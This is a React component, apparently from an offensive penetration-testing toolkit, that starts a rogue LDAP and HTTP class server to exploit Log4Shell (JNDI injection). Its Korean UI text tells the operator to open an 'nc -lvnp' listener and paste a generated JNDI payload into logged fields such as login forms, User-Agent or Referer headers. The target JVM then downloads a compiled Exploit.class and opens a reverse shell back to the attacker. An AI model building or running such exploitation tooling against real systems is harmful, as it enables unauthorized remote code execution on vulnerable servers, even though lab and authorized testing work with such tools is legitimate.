import { useEffect, useState } from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";

const api = async <T,>(path: string, init?: RequestInit): Promise<T> => {
  const r = await fetch("/api" + path, init);
  if (!r.ok) throw new Error((await r.json()).detail || r.statusText);
  return r.json();
};

type JndiState = {
  running: boolean;
  javac_available: boolean;
  ldap_port?: number;
  http_port?: number;
  lhost?: string;
  lport?: number;
  jndi_payload?: string;
};

// Log4ShellPayloadReference only builds probe strings for confirming the
// vulnerability exists (a plain nc listener catching any connection is
// enough for that). This is the next step -- actually exploiting it. Unlike
// everything else in that reference component, clicking "리스너 시작" here
// really does start a live rogue LDAP server + HTTP class server (same
// category of action as ReverseShellPanel's nc/socat listener), so it's
// deliberately a separate, more visually distinct section instead of one
// more row in that payload table.
export default function JndiRceListenerPanel() {
  const qc = useQueryClient();
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("4444");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const response = await fetch("/api/vpn/status");
      if (!response.ok || cancelled) return;
      const data = await response.json();
      const match = /(\d{1,3}\.){3}\d{1,3}/.exec(data.tun0 || "");
      if (match && !cancelled) setLhost((current) => current || match[0]);
    })();
    return () => { cancelled = true; };
  }, []);

  const status = useQuery({
    queryKey: ["jndiListenerStatus"],
    queryFn: () => api<JndiState>("/jndi-listener/status"),
    refetchInterval: 4000,
  });

  const start = useMutation({
    mutationFn: () => api<JndiState>("/jndi-listener/start", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ lhost, lport: Number(lport) }),
    }),
    onSuccess: (data) => qc.setQueryData(["jndiListenerStatus"], data),
  });
  const stop = useMutation({
    mutationFn: () => api<JndiState>("/jndi-listener/stop", { method: "POST" }),
    onSuccess: (data) => qc.setQueryData(["jndiListenerStatus"], data),
  });

  const data = status.data;
  const running = !!data?.running;
  const error = start.error instanceof Error ? start.error.message
    : stop.error instanceof Error ? stop.error.message : undefined;

  const copyPayload = async () => {
    if (!data?.jndi_payload) return;
    await navigator.clipboard.writeText(data.jndi_payload);
    setCopied(true);
    window.setTimeout(() => setCopied(false), 1500);
  };

  return (
    <section className="netexecCredCheck" aria-labelledby="jndi-rce-heading">
      <header>
        <h2 id="jndi-rce-heading">JNDI 실전 RCE 리스너 (rogue LDAP)</h2>
        <small>marshalsec 없이 순수 Python으로 구현한 최소 LDAP 서버 -- 아무 bind/search에나
          컴파일된 리버스쉘 class를 가리키는 referral로 응답합니다.</small>
      </header>
      <p className="netexecEvidenceMsg">
        위 카탈로그의 페이로드가 콜백을 받았다면(취약점 확인됨), 여기서 진짜 RCE 리스너를 켜고
        아래 JNDI 페이로드를 대신 사용하세요. LPORT는 리버스쉘이 접속해올 포트입니다 —
        먼저 <code>nc -lvnp {lport}</code>를 (또는 리버스쉘 패널의 리스너를) 열어두세요.
      </p>
      {data && !data.javac_available && (
        <p className="webError" role="alert">
          javac가 설치되어 있지 않습니다 — <code>sudo apt install default-jdk</code> 실행 후
          다시 시도하세요.
        </p>
      )}
      <div className="netexecCredForm">
        <input value={lhost} onChange={(e) => setLhost(e.target.value)}
          placeholder="LHOST (tun0)" aria-label="LHOST" disabled={running} />
        <input value={lport} onChange={(e) => setLport(e.target.value)}
          placeholder="LPORT (리버스쉘)" aria-label="LPORT" disabled={running} />
        <button type="button" disabled={running ? stop.isPending : start.isPending || !lhost}
          onClick={() => running ? stop.mutate() : start.mutate()}>
          {running ? (stop.isPending ? "중지 중…" : "리스너 중지")
            : (start.isPending ? "시작 중…" : "리스너 시작")}
        </button>
      </div>
      {error && <p className="webError" role="alert">{error}</p>}
      {running && data?.jndi_payload && (
        <div className="netexecPwned">
          <b>리스너 실행 중 · LDAP {data.ldap_port} · HTTP {data.http_port}</b>
          <span>
            아래 페이로드를 로그로 남을 만한 입력값(로그인 폼, User-Agent, Referer 등)에
            붙여넣으세요. JVM이 이 LDAP 서버에 접속해 referral을 받고, HTTP로 컴파일된
            Exploit.class를 내려받아 실행하면 <code>{lhost}:{lport}</code>로 리버스쉘이
            접속합니다.
          </span>
          <code style={{ display: "block", wordBreak: "break-all", margin: "6px 0" }}>
            {data.jndi_payload}
          </code>
          <div className="netexecPwnedActions">
            <button onClick={() => void copyPayload()}>{copied ? "복사됨" : "페이로드 복사"}</button>
          </div>
        </div>
      )}
    </section>
  );
}
